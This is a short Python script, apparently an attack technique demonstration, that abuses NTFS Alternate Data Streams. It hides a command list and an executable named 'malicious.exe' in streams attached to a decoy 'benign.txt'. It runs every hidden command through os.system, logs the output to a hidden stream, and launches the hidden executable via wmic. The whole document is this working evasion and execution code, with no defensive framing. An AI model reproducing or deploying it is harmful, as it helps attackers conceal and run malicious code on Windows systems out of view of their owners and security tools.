import os

def buildADSFilename(filename,streamname):
	return filename+":"+streamname

decoy = "benign.txt"
resultfile = buildADSFilename(decoy,"results.txt")
commandfile = buildADSFilename(decoy,"commands.txt")

# Run commands from file
with open(commandfile,"r") as c:
    for line in c:
        str(os.system(line + " >> " + resultfile))

# Run executable
exefile = "malicious.exe"
exepath = os.path.join(os.getcwd(),buildADSFilename(decoy,exefile))
os.system("wmic process call create "+exepath)